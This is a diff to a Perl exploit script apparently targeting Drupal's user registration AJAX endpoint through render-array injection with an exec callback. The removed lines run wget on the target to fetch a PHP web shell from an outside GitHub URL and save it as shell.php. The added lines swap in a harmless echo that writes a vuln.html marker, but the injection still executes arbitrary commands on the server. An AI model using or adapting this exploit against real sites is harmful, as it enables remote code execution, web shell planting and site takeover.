@@ -164,16 +164,11 @@ chomp($url);
 
 $exploit = "$url/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";
 
-$ajax = "_drupa_ajax";
-$mail = "mail[#post_render][]";
-$maill= "mail[#type]";
-$mailll = "mail[#markup]";
-$wget = "wget https://raw.githubusercontent.com/dr-iman/SpiderProject/master/lib/exploits/web-app/wordpress/ads-manager/payload.php -0 shell.php";
-$response = $ua->post($exploit, Content-Type => 'multipart/form-data', Content => [form_id => 'user_register_form', $ajax => '1', $mail => 'exec', $maill => 'markup', $mailll => $wget]);
+$response = $ua->post($exploit, Content => ["form_id" => "user_register_form", "_drupa_ajax" => "1", "mail[#post_render][]" => "exec", "mail[#type]" => "markup", "mail[#markup]" => "echo Vuln!! patch it Now!> vuln.html"]);
 
-$shell = "$url/shell.php";
+$shell = "$url/vuln.html";
 my $content = $ua->get("$shell")->content;
-if ($content =~ /Spider Project/)
+if ($content =~ /Vuln/)
 {
 print "\nPayload Uploaded successfully $shell\n";
 }
